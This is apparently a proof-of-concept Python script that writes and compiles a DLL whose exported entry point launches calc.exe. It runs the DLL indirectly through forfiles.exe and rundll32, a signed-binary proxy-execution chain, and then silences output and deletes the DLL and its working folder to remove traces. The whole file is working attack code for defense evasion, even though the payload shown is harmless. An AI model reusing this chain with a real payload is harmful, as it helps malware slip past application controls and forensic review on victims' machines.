import os
import shutil
import subprocess
import sys
import time

WORK_DIR = r"C:\Temp\ForFilesExploit"
FOR_FILES = r"C:\Windows\System32\forfiles.exe"
VARSALL_BAT = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
CL_EXE = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe"

DLL_SRC = "test.c"
DLL_DEF = "test.def"
RUN_DLL_PATH = os.path.join(WORK_DIR, "test.dll")
FORFILES_PATH = r"C:\Windows\System32"
FORFILES_PATTERN = r"notepad.exe"

def write_sources():
    os.makedirs(WORK_DIR, exist_ok=True)
    with open(os.path.join(WORK_DIR, DLL_SRC), "w", encoding="utf-8") as f:
        f.write(r'''#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    system("calc.exe");
}
''')
    with open(os.path.join(WORK_DIR, DLL_DEF), "w", encoding="utf-8") as f:
        f.write(r'''LIBRARY test
EXPORTS
    EntryPoint
''')

def build_dll():
    cmd = (
        f'"{VARSALL_BAT}" x64 && '
        f'"{CL_EXE}" /LD "{DLL_SRC}" /link /DEF:"{DLL_DEF}"'
    )
    subprocess.run(
        cmd,
        cwd=WORK_DIR,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )
    dll_out = os.path.join(WORK_DIR, "test.dll")
    if not os.path.exists(dll_out):
        raise FileNotFoundError(dll_out)
    return dll_out

def deploy_and_run(dll_path):
    if dll_path != RUN_DLL_PATH and os.path.exists(dll_path):
        dest_dir = os.path.dirname(RUN_DLL_PATH)
        os.makedirs(dest_dir, exist_ok=True)
        shutil.copy2(dll_path, RUN_DLL_PATH)
        dll_to_run = RUN_DLL_PATH
    else:
        dll_to_run = dll_path

    if not os.path.exists(dll_to_run):
        return

    inner = f'cmd /c rundll32 "{dll_to_run}",EntryPoint'
    cmd = f'"{FOR_FILES}" /p "{FORFILES_PATH}" /m "{FORFILES_PATTERN}" /c "{inner}"'

    proc = subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    try:
        os.remove(dll_to_run)
    except OSError:
        pass

def cleanup_workdir():
    if os.path.isdir(WORK_DIR):
        for name in os.listdir(WORK_DIR):
            path = os.path.join(WORK_DIR, name)
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                else:
                    os.remove(path)
            except Exception:
                pass
        try:
            os.rmdir(WORK_DIR)
        except OSError:
            pass

if __name__ == "__main__":
    write_sources()
    try:
        dll = build_dll()
    except subprocess.CalledProcessError:
        sys.exit(1)
    time.sleep(1)
    deploy_and_run(dll)
    time.sleep(1)
    cleanup_workdir()
